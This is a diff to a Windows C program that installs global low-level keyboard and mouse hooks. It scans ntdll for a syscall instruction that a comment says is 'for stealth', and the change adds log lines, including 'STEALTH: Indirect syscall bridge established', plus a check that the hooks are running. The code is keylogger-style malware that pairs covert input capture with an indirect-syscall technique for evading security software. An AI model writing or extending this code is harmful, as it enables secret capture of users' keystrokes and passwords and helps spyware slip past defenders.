@@ -207,7 +207,11 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 
 // --- 7. ENTRY POINT ---
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
-    // Search for syscall instruction inside ntdll for stealth
+
+    // 1. Start the log
+    WriteLog("=== SYSTEM STARTING ===");
+    
+   // 2. Search for syscall instruction inside ntdll for stealth
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (ntdll) {
         BYTE* addr = (BYTE*)GetProcAddress(ntdll, "NtQuerySystemInformation");
@@ -215,6 +219,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
             for (int i = 0; i < 50; i++) {
                 if (addr[i] == 0x0F && addr[i+1] == 0x05 && addr[i+2] == 0xC3) {
                     sys_addr = (UINT_PTR)&addr[i];
+                    WriteLog("STEALTH: Indirect syscall bridge established.");
                     break;
                 }
             }
@@ -223,6 +228,14 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
 
     HHOOK hKey = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc, h, 0);
     HHOOK hMouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, h, 0);
+
+    // 4. VERIFICATION CHECK
+    if (hKey && hMouse) {
+        WriteLog("Hooks Online. Monitoring input..."); 
+    } else {
+        WriteLog("CRITICAL ERROR: Hooks failed to initialize.");
+        return 1;
+    }
     
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
